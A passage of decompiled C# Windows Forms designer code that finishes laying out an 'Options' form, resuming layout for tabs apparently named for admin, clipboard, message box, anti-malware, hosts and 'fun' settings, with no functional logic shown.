        this.PanelRight.Size = new System.Drawing.Size(25, 367);
        this.PanelRight.TabIndex = 591;
        this.FormDragControl1.Fixed = true;
        this.FormDragControl1.Horizontal = true;
        this.FormDragControl1.TargetControl = this.PanelTitle;
        this.FormDragControl1.Vertical = true;
        this.Timer1.Interval = 2000;
        this.Timer1.Tick += new System.EventHandler(Timer1_Tick);
        this.im.ImageStream = (System.Windows.Forms.ImageListStreamer)resources.GetObject("im.ImageStream");
        this.im.TransparentColor = System.Drawing.Color.FromArgb(82, 43, 235);
        this.im.Images.SetKeyName(0, "D.png");
        this.im.Images.SetKeyName(1, "Anti.png");
        base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
        base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
        this.BackColor = System.Drawing.Color.Gainsboro;
        base.ClientSize = new System.Drawing.Size(856, 610);
        base.Controls.Add(this.panelForm);
        base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
        base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
        base.Name = "Options";
        base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
        this.Text = "Options";
        base.TransparencyKey = System.Drawing.Color.Gainsboro;
        base.FormClosing += new System.Windows.Forms.FormClosingEventHandler(Options_FormClosing);
        base.Load += new System.EventHandler(Options_Load);
        base.Shown += new System.EventHandler(Options_Shown);
        this.panelForm.ResumeLayout(false);
        this.PaneControll.ResumeLayout(false);
        this.PageOption.ResumeLayout(false);
        this.PageSettings.ResumeLayout(false);
        this.PageSettings.PerformLayout();
        ((System.ComponentModel.ISupportInitialize)this.pictureBox2).EndInit();
        this.PageAdmin.ResumeLayout(false);
        this.PageAdmin.PerformLayout();
        this.tabPage_0.ResumeLayout(false);
        this.tabPage_0.PerformLayout();
        this.PanelMune.ResumeLayout(false);
        this.PanelMune.PerformLayout();
        ((System.ComponentModel.ISupportInitialize)this.ListReferences).EndInit();
        this.ContectRefrences.ResumeLayout(false);
        this.toolStrip1.ResumeLayout(false);
        this.toolStrip1.PerformLayout();
        this.TopTols.ResumeLayout(false);
        this.TopTols.PerformLayout();
        this.PageClipboard.ResumeLayout(false);
        this.PageClipboard.PerformLayout();
        this.toolStrip2.ResumeLayout(false);
        this.toolStrip2.PerformLayout();
        this.PageMessageBox.ResumeLayout(false);
        this.PageMessageBox.PerformLayout();
        this.toolStrip3.ResumeLayout(false);
        this.toolStrip3.PerformLayout();
        this.PageAnti.ResumeLayout(false);
        this.PageAnti.PerformLayout();
        ((System.ComponentModel.ISupportInitialize)this.ListAntiMalware).EndInit();
        this.ContexAntiMelware.ResumeLayout(false);
        this.toolStrip4.ResumeLayout(false);
        this.toolStrip4.PerformLayout();
        this.PageFun.ResumeLayout(false);
        this.PageFun.PerformLayout();
        ((System.ComponentModel.ISupportInitialize)this.ImageIndex).EndInit();
        this.PageHosts.ResumeLayout(false);
        this.PageHosts.PerformLayout();
        this.toolStrip5.ResumeLayout(false);
        this.toolStrip5.PerformLayout();
        this.PanelTitle.ResumeLayout(false);
        this.PanelTitle.PerformLayout();
        ((System.ComponentModel.ISupportInitialize)this.ImageLogo).EndInit();
        base.ResumeLayout(false);
    }
}
